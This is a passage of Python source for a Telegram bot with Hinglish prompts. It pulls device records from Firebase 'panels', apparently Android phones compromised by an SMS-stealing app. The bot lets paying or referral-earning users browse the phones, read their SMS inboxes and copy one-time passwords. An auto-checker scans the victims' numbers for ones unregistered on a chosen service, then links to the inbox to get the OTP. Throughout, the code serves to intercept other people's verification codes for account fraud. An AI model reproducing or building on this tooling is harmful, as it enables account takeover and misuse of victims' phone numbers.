    else: users_db, is_admin = all_users, is_root_admin(chat_id)

    if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return
    
    try:
        if data == "check_join":
            if is_main_bot and await check_membership(bot_token, ctx.bot, chat_id):
                return await query.answer("❌ Abhi bhi saare channels join karna baki hai!", show_alert=True)
            users_db.setdefault(chat_id, {})["verified"] = True; chats_registry.setdefault(bot_token, set()).add(chat_id)
            await query.message.delete()
            return await ctx.bot.send_message(chat_id, "✅ Verification successful! Welcome to the bot.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            
        try: await query.answer()
        except: pass

        if data == "noop": return
        if data == "close_msg": return await query.message.delete()
        
        if data == "redeem_vip":
            u = users_db.get(chat_id, {})
            avail_refs = u.get("referrals", 0) - u.get("spent_refs", 0)
            if avail_refs >= 15:
                users_db[chat_id]["spent_refs"] = u.get("spent_refs", 0) + 15
                users_db[chat_id]["vip_until"] = time.time() + 3600  # 1 Hour VIP
                await safe_edit(query, "✅ <b>VIP ACTIVATED!</b>\n\nAapke 15 referrals use ho gaye hain. Agle 1 Ghante tak Unlimited Checker aur Online Devices access karein!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
            else:
                await query.answer(f"❌ Not enough referrals! You need 15, but have {avail_refs}.", show_alert=True)
            return

        if data == "open_checker_menu":
            return await safe_edit(query, "<b>Select Checker</b>", reply_markup=get_checker_menu(is_auto_fb=False), parse_mode="HTML")
            
        if data == "open_auto_fb_menu":
            return await safe_edit(query, "🔥 <b>AUTO-CHECK FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to auto-check on a live Firebase number:", reply_markup=get_checker_menu(prefix="auto_fb:", is_auto_fb=True), parse_mode="HTML")

        if data.startswith("search_num:"):
            search_term = data.split(":")[1]
            await safe_edit(query, f"⏳ Searching databases for {search_term}...")
            all_devices = await get_all_devices(bot_token)
            found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
            if not found_devs: return await safe_edit(query, f"📭 No online devices found for {search_term}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            return await safe_edit(query, f"🔍 Search Results for: {search_term}\nSelect below:", reply_markup=InlineKeyboardMarkup(rows))

        if data.startswith("chk_srv:"):
            is_ok, msg = check_user_limit(chat_id)
            if not is_ok: return await safe_edit(query, msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            return await safe_edit(query, f"Send a 10 digit number to check on {service.capitalize()}:")
            
        if data.startswith("auto_fb:") or data.startswith("my_fb:"):
            is_ok, msg = check_user_limit(chat_id)
            if not is_ok: return await safe_edit(query, msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            is_my_db = data.startswith("my_fb:")
            service = data.split(":")[1]
            
            if is_my_db:
                personal_dbs = users_db.get(chat_id, {}).get("personal_dbs", [])
                if not personal_dbs: return await safe_edit(query, "❌ Aapne abhi tak koi Personal Firebase add nahi kiya hai. Pehle '➕ Add My Panel' pe click karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                await safe_edit(query, f"🔥 <b>AUTO-CHECK MY PANEL</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching your personal databases...</i>", parse_mode="HTML")
                tasks = [fetch_single_db(f"U_{chat_id}", url) for url in personal_dbs]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                devices = [d for r in results if isinstance(r, tuple) for d in r[1]]
            else:
                await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning databases for fresh numbers...</i>", parse_mode="HTML")
                unlocked = SYS_SETTINGS.get("unlocked_panels", [])
                all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
                unique_devices, seen_n = [], set()
                for d in all_devs:
                    if d.numbers:
                        new_nums = [n for n in d.numbers if n not in seen_n]
                        if not new_nums: continue 
                        d.numbers = new_nums
                        seen_n.update(new_nums)
                    unique_devices.append(d)
                devices = unique_devices
                
            fresh_devices = [d for d in devices if d.numbers and d.status == "online"]
            if not fresh_devices: 
                return await safe_edit(query, "❌ No active online numbers found right now.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            random.shuffle(fresh_devices)
            seen_set = user_seen_unreg.setdefault(chat_id, set())
            if len(seen_set) > 50: seen_set.clear()
            
            found_unreg, final_res, final_dev, final_num = False, None, None, ""
            total_scan = len(fresh_devices)
            
            for idx, dev in enumerate(fresh_devices, 1):
                target_num = dev.numbers[0]
                if target_num in seen_set: continue
                    
                await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Auto-Scanning... [{idx}/{total_scan}]\n📱 Checking: <code>+91{target_num[-10:]}</code>\n⚡ <i>Hitting {service.upper()} API...</i>", parse_mode="HTML")
                res = await check_number_api(service, target_num)
                is_error = res.get("status") == "error"
                if is_error: await asyncio.sleep(1.0); continue
                    
                is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                
                if not is_reg: 
                    found_unreg, final_res, final_dev, final_num = True, res, dev, target_num
                    break
                await asyncio.sleep(1.5)
            
            if found_unreg:
                seen_set.add(final_num)
                trigger_limit_if_unregistered(chat_id, False, False)
                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                kb = [
                    [InlineKeyboardButton("📩 View Inbox (Get OTP)", callback_data=f"msgs:{final_dev.id}")],
                    [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=data)],
                    [InlineKeyboardButton("🏠 Select Checker", callback_data="open_auto_fb_menu" if not is_my_db else "close_msg")]
                ]
            else:
                res_text = f"<b>✅ ALL REGISTERED</b>\n\nI checked {total_scan} freshest numbers and all are already registered."
                kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]
                
            return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

        # 🔥 ADMIN PANEL
        if data == "admin_maint" and is_admin:
            SYS_SETTINGS["maintenance"] = not SYS_SETTINGS.get("maintenance", False)
            status = "ON" if SYS_SETTINGS["maintenance"] else "OFF"
            return await safe_edit(query, f"🚧 Maintenance Mode is now {status}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
            
        if data == "cmd_status" and is_admin:
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            total_devs, online_devs = sum(len(d) for d in GLOBAL_DEVICE_CACHE.values()), sum(1 for d in [dev for lst in GLOBAL_DEVICE_CACHE.values() for dev in lst] if d.status == "online")
            return await safe_edit(query, f"📊 BOT STATUS\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n📱 Total Devices  : {total_devs}\n🟢 Online        : {online_devs}\n🔴 Offline       : {total_devs - online_devs}\n", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status")], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

        if data == "admin_refresh" and is_admin: return await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
            
        if data == "admin_add_firebase" and is_admin and is_main_bot:
            pending_action[chat_id] = {"action": "add_firebase_main"}
            return await safe_edit(query, "🔗 ADD FIREBASE DATABASE\nFormat: <code>Name: URL</code>\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

        if data == "admin_users" and is_admin:
            lines = ["👥 User List (Top 50)\n━━━━━━━━━━━━━━━━━━\n"] + [f"{i}. {'🚫' if info.get('banned') else ('✅' if info.get('verified') else '⏳')} {user_display(info)}\n   ID: <code>{uid}</code> | OTPs: {info.get('otp_count',0)}" for i, (uid, info) in enumerate(list(users_db.items())[:50], 1)]
            return await safe_edit(query, "\n".join(lines)[:4000] + "\n\nTip: To ban someone type /ban ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))

        if data == "admin_broadcast" and is_admin:
            pending_action[chat_id] = {"action": "broadcast_msg"}
            return await safe_edit(query, "📢 BROADCAST MESSAGE\nType the message below:\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

        if data == "admin_gift_coins" and is_admin:
            pending_action[chat_id] = {"action": "gift_coins_all"}
            return await safe_edit(query, "🎁 GIFT COINS TO ALL USERS\nKitne coins send karne hain? (Jaise: 50):\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

        if data == "admin_gift_vip" and is_admin:
            pending_action[chat_id] = {"action": "gift_vip"}
            return await safe_edit(query, "🎁 GIFT VIP TO SPECIFIC USER\n━━━━━━━━━━━━━━━━━━\nUser ID aur Hours space dekar bhejein.\n\nExample (4 hours ke liye): <code>123456789 4</code>\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

        if data == "admin_api_mgmt" and is_admin:
            api_keys = SYS_SETTINGS.get("api_keys", [])
            text = f"🔑 API MANAGEMENT\n━━━━━━━━━━━━━━━━━━\nCurrent Keys: {len(api_keys)}\nMain Key: <code>{api_keys[0] if api_keys else 'None'}</code>"
            kb = [[InlineKeyboardButton("➕ Add New Key", callback_data="adm_add_key")], [InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]
            return await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
            
        if data == "adm_add_key" and is_admin:
            pending_action[chat_id] = {"action": "add_api_key"}
            return await safe_edit(query, "🔑 ADD API KEY\nSend the SuperAssets API Key:\n\n❌ Cancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
            
        if data == "adm_del_key" and is_admin:
            pending_action[chat_id] = {"action": "del_api_key"}
            text = "🗑 REMOVE API KEY\n━━━━━━━━━━━━━━━━━━\nYahan wo API Key paste karein jise aap delete karna chahte hain:\n\n❌ Cancel: /cancel"
            return await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

        if data == "admin_chk_mgmt" and is_admin:
            text = "🔎 CHECKER MANAGEMENT\n━━━━━━━━━━━━━━━━━━\nActive Checkers:\n"
            for k, v in SYS_SETTINGS.get("services", {}).items(): text += f"• {v['emoji']} {v['name']} [{'ON' if v['enabled'] else 'OFF'}]\n"
            kb = [[InlineKeyboardButton("Toggle Services (Soon)", callback_data="noop")], [InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]
            return await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))

        if data.startswith("admin_panellock:"):
            if not is_admin: return
            page = int(data.split(":")[1])
            return await safe_edit(query, "🔐 <b>PANEL LOCK/UNLOCK MANAGER</b>\n━━━━━━━━━━━━━━━━━━\n<i>Only Unlocked (🔓) panels will be visible to normal users.</i>\n<i>As Admin, you have unlimited access to ALL panels regardless of status.</i>", reply_markup=get_panel_lock_keyboard(page), parse_mode="HTML")

        if data.startswith("tgl_pnl:"):
            if not is_admin: return
            _, tag, page = data.split(":")
            unlocked = SYS_SETTINGS.setdefault("unlocked_panels", [])
            if tag in unlocked: unlocked.remove(tag)
            else: unlocked.append(tag)
            return await safe_edit(query, "🔐 <b>PANEL LOCK/UNLOCK MANAGER</b>\n━━━━━━━━━━━━━━━━━━\n<i>Only Unlocked (🔓) panels will be visible to normal users.</i>\n<i>As Admin, you have unlimited access to ALL panels regardless of status.</i>", reply_markup=get_panel_lock_keyboard(int(page)), parse_mode="HTML")

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None); pending_action.pop(chat_id, None)
            if not is_vip(bot_token, chat_id): return await safe_edit(query, "🚫 VIP Access Required!", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            unlocked = SYS_SETTINGS.get("unlocked_panels", [])
            all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
            unique_devices, seen_n = [], set()
            for d in all_devs:
                if d.numbers:
                    new_nums = [n for n in d.numbers if n not in seen_n]
                    if not new_nums: continue 
                    d.numbers = new_nums
                    seen_n.update(new_nums)
                unique_devices.append(d)
            
            devices = [d for d in unique_devices if d.status == "online"]
            devices.sort(key=lambda d: (0 if len(d.numbers) > 0 else 1, -d.timestamp))

            return await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))

        if data.startswith("pg:"):
            if not is_vip(bot_token, chat_id): return
            page = int(data[3:])
            
            unlocked = SYS_SETTINGS.get("unlocked_panels", [])
            all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
            unique_devices, seen_n = [], set()
            for d in all_devs:
                if d.numbers:
                    new_nums = [n for n in d.numbers if n not in seen_n]
                    if not new_nums: continue 
                    d.numbers = new_nums
                    seen_n.update(new_nums)
                unique_devices.append(d)
            
            devices = [d for d in unique_devices if d.status == "online"]
            devices.sort(key=lambda d: (0 if len(d.numbers) > 0 else 1, -d.timestamp))
            
            return await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))

        if data.startswith("cp:"):
            try: await query.answer(f"✅ OTP: {data[3:]}", show_alert=True)
            except: pass; return

        if data.startswith("sel:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[4:]
            
            all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
            device = next((d for d in all_devs if d.id == dev_id), None)
            
            if not device and "personal_dbs" in users_db.get(chat_id, {}):
                pdbs = users_db[chat_id]["personal_dbs"]
                results = await asyncio.gather(*[fetch_single_db("U", url) for url in pdbs], return_exceptions=True)
                p_devs = [d for r in results if isinstance(r, tuple) for d in r[1]]
                device = next((d for d in p_devs if d.id == dev_id), None)

            if not device: return await query.answer("❌ Device not found or offline!", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            await safe_edit(query, f"📱 CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {device_label(device)}\nStatus  : {'🟢 Online' if device.status == 'online' else '🔴 Offline'}\nBattery : {bat_emoji(device.battery)} {device.battery}%\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\n⚠️ You are now receiving LIVE OTPs for this number.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}")], [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")]]))
            return

        if data.startswith("msgs:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[5:]
            all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
            device = next((d for d in all_devs if d.id == dev_id), None)
            
            if not device and "personal_dbs" in users_db.get(chat_id, {}):
                pdbs = users_db[chat_id]["personal_dbs"]
                results = await asyncio.gather(*[fetch_single_db("U", url) for url in pdbs], return_exceptions=True)
                p_devs = [d for r in results if isinstance(r, tuple) for d in r[1]]
                device = next((d for d in p_devs if d.id == dev_id), None)

            if not device: return await query.answer("❌ Device not found!", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            smss, label = await get_device_sms(device), device_label(device)
            if not smss: return await safe_edit(query, f"📭 {label}\n\nNo SMS found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]]))
                
            body_parts, otp_buttons, has_otp = [], [], False
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                body_parts.append(block)
                if otp: has_otp = True; otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            full_text = f"📩 MESSAGES LOG\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n" + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
            otp_buttons.append([InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel:{dev_id}")])
            return await safe_edit(query, full_text[:4000] + ("\n...[more]" if len(full_text)>4000 else ""), reply_markup=InlineKeyboardMarkup(otp_buttons))

        if data.startswith("info:"):
            if not is_vip(bot_token, chat_id): return
            dev_id = data[5:]
            all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
            device = next((d for d in all_devs if d.id == dev_id), None)
            if not device: return await query.answer("❌ Device not found!", show_alert=True)
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            text = f"ℹ️ DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {device_label(device)}\nStatus  : {'🟢 Online' if device.status == 'online' else '🔴 Offline'}\nBattery : {bat_emoji(device.battery)} {device.battery}%\nServer  : {device.db_tag}\n" + "".join([f"SIM {i}   : <code>{num}</code>\n" for i, num in enumerate(device.numbers, 1)]) + (f"\n{device.device_info}\n" if device.device_info else "")
            return await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Back", callback_data=f"sel:{dev_id}")], [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")]]))

    except Exception as e: pass

# ══════════════════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ══════════════════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.type != "private": return
    if not update.message or not update.message.text: return
    
    chat_id, text, bot_token = update.effective_chat.id, update.message.text.strip(), ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    
    if SYS_SETTINGS.get("maintenance") and not is_root_admin(chat_id):
        return await update.message.reply_text("🚧 <b>Checker is currently under maintenance.</b>\nPlease try again later.", parse_mode="HTML")

    if not is_main_bot:
        if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: return await update.message.reply_text("Premium Expired.", parse_mode="HTML")
        users_db, is_admin = CLONES[bot_token]["users"], (chat_id == CLONES[bot_token]["creator"])
    else: users_db, is_admin = all_users, is_root_admin(chat_id)

    unjoined = await check_membership(bot_token, ctx.bot, chat_id)
    if unjoined: return await send_join_prompt(update, is_main_bot)

    if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return

    # 🔥 OWNER MANAGEMENT COMMANDS
    if is_root_admin(chat_id) and text.startswith("/addowner "):
        try:
            new_id = int(text.split()[1])
            if new_id not in SYS_SETTINGS["admins"]:
                SYS_SETTINGS["admins"].append(new_id)
                await update.message.reply_text(f"✅ Success! User `{new_id}` is now an Owner.", parse_mode="Markdown")
            else: await update.message.reply_text("⚠️ User is already an Owner.")
        except: await update.message.reply_text("❌ Format: `/addowner 123456789`", parse_mode="Markdown")
        return
        
    if is_root_admin(chat_id) and text.startswith("/delowner "):
        try:
            del_id = int(text.split()[1])
            if del_id == 6860106371: return await update.message.reply_text("❌ You cannot delete the Root Owner.")
            if del_id in SYS_SETTINGS["admins"]:
                SYS_SETTINGS["admins"].remove(del_id)
                await update.message.reply_text(f"✅ User `{del_id}` is removed from Owners.", parse_mode="Markdown")
            else: await update.message.reply_text("⚠️ User is not an Owner.")
        except: await update.message.reply_text("❌ Format: `/delowner 123456789`", parse_mode="Markdown")
        return

    if is_admin and text.startswith("/ban "):
        try:
            target_id = int(text.split()[1])
            if target_id in users_db: users_db[target_id]["banned"] = True; user_focus.setdefault(bot_token, {}).pop(target_id, None); return await update.message.reply_text(f"✅ Banned {target_id}", parse_mode="HTML")
        except: pass
        
    if is_admin and text.startswith("/unban "):
        try:
            target_id = int(text.split()[1])
            if target_id in users_db: users_db[target_id]["banned"] = False; return await update.message.reply_text(f"✅ Unbanned {target_id}", parse_mode="HTML")
        except: pass

    if text == "🕵️‍♂️ Number Checker":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        is_ok, msg = check_user_limit(chat_id)
        if not is_ok: return await update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")]]))
        return await update.message.reply_text("<b>Select Checker</b>", reply_markup=get_checker_menu(is_auto_fb=False), parse_mode="HTML")

    if text == "🔥 Auto Global DB":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        is_ok, msg = check_user_limit(chat_id)
        if not is_ok: return await update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")]]))
        return await update.message.reply_text("🔥 <b>AUTO-CHECK GLOBAL DB</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to auto-check on a live Firebase number:", reply_markup=get_checker_menu(prefix="auto_fb:", is_auto_fb=True), parse_mode="HTML")

    if text == "🔥 Auto My DB":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        is_ok, msg = check_user_limit(chat_id)
        if not is_ok: return await update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")]]))
        if not users_db.get(chat_id, {}).get("personal_dbs"): return await update.message.reply_text("❌ Aapne abhi tak koi Personal Firebase add nahi kiya hai. Pehle '➕ Add My Panel' pe click karein.")
        return await update.message.reply_text("🔥 <b>AUTO-CHECK MY DB</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to auto-check on YOUR live Firebase numbers:", reply_markup=get_checker_menu(prefix="my_fb:", is_auto_fb=True), parse_mode="HTML")

    if text == "➕ Add My Panel":
        pending_action[chat_id] = {"action": "add_personal_db"}
        return await update.message.reply_text("➕ <b>ADD PERSONAL FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein:\n(Example: https://my-panel-default-rtdb.firebaseio.com)\n\n❌ Cancel: /cancel", parse_mode="HTML")

    if text == "📱 Online Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        if not is_vip(bot_token, chat_id): return await update.message.reply_text("🚫 VIP Access Required!", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        
        unlocked = SYS_SETTINGS.get("unlocked_panels", [])
        all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
        unique_devices, seen_n = [], set()
        for d in all_devs:
            if d.numbers:
                new_nums = [n for n in d.numbers if n not in seen_n]
                if not new_nums: continue 
                d.numbers = new_nums
                seen_n.update(new_nums)
            unique_devices.append(d)
        
        devices = [d for d in unique_devices if d.status == "online"]
        devices.sort(key=lambda d: (0 if len(d.numbers) > 0 else 1, -d.timestamp))
        
        return await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")

    if text == "🔍 Search Number":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id): return await update.message.reply_text("🚫 VIP Access Required!", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        pending_action[chat_id] = {"action": "search_number"}
        return await update.message.reply_text("🔍 SEARCH NUMBER\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below:\n\n❌ Cancel: /cancel", parse_mode="HTML")

    if text == "📊 Bot Status" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        total_devs, online_devs = sum(len(d) for d in GLOBAL_DEVICE_CACHE.values()), sum(1 for d in [dev for lst in GLOBAL_DEVICE_CACHE.values() for dev in lst] if d.status == "online")
        db_lines = "\n".join([f"🗄 DB {tag}: {len(devs)} devices" for tag, devs in GLOBAL_DEVICE_CACHE.items() if len(devs) > 0])
        return await update.message.reply_text(f"📊 BOT STATUS\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n📱 Total Devices  : {total_devs}\n🟢 Online        : {online_devs}\n🔴 Offline       : {total_devs - online_devs}\n", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")

    if text == "🔑 Recent OTPs":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id): return await update.message.reply_text("🚫 VIP Access Required!", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        wait_msg = await update.message.reply_text("⏳ Fetching Recent Global OTPs...", parse_mode="HTML")
        found = []
        for d in await get_all_devices(bot_token):
            for sms in await get_device_sms(d, 20):
                otp = extract_otp(sms.get("body") or sms.get("message") or sms.get("text") or "")
                if otp: found.append((otp, device_label(d), sms.get("sender") or "?", sms_date(sms), d.db_tag))
            if len(found) >= 10: break
        
        if not found: return await wait_msg.edit_text("📭 No recent OTPs found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
        found.sort(key=lambda x: x[3], reverse=True)
        otp_text = "🔑 RECENT OTPS (Latest First)\n━━━━━━━━━━━━━━━━━━\n" + "".join([f"<code>{o}</code> — {l} ({s}) [{t}]\n📅 {d}\n━━━━━━━━━━━━━━━━━━\n" for o, l, s, d, t in found[:10]])
        return await wait_msg.edit_text(otp_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")

    if text.startswith("🤖 Create Your Bot") and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        req_coins = 20 + (users_db.get(chat_id, {}).get("bots_created", 0) * 10)
        if users_db.get(chat_id, {}).get("coins", 0) >= req_coins:
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req_coins}
            return await update.message.reply_text(f"🤖 CREATE YOUR CLONE BOT\n━━━━━━━━━━━━━━━━━━\nAap {req_coins} coins use karke agle 24 ghante ke liye apna bot bana sakte hain.\n\nPehle @BotFather pe jaake naya bot banayein, aur uska HTTP API Token yahan bhejein.\n\n❌ Cancel: /cancel", parse_mode="HTML")
        else: return await update.message.reply_text(f"❌ Not Enough Coins\n━━━━━━━━━━━━━━━━━━\nAapke paas {users_db.get(chat_id, {}).get('coins', 0)} Coins hain. Bot banane ke liye {req_coins} Coins chahiye.\nApne doston ko refer karke aur coins kamayein!", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")

    if text == "👑 Buy VIP (20 Coins)" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if all_users.get(chat_id, {}).get("coins", 0) >= 20:
            all_users[chat_id]["coins"] -= 20
            all_users[chat_id]["vip_until"] = max(time.time(), all_users[chat_id].get("vip_until", 0.0)) + (10 * 3600)
            return await update.message.reply_text(f"✅ VIP Purchased Successfully!\n━━━━━━━━━━━━━━━━━━\n20 Coins deducted.\nAapke paas ab agle 10 ghante tak full bot access hai.\nEnjoy!", reply_markup=get_reply_menu(is_admin, bot_token, chat_id), parse_mode="HTML")
        else: return await update.message.reply_text(f"❌ Not Enough Coins\n━━━━━━━━━━━━━━━━━━\nAapke paas {all_users.get(chat_id, {}).get('coins', 0)} Coins hain. VIP ke liye 20 Coins chahiye.", reply_markup=get_vip_denied_keyboard(chat_id), parse_mode="HTML")

    if text == "🏆 Leaderboard":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
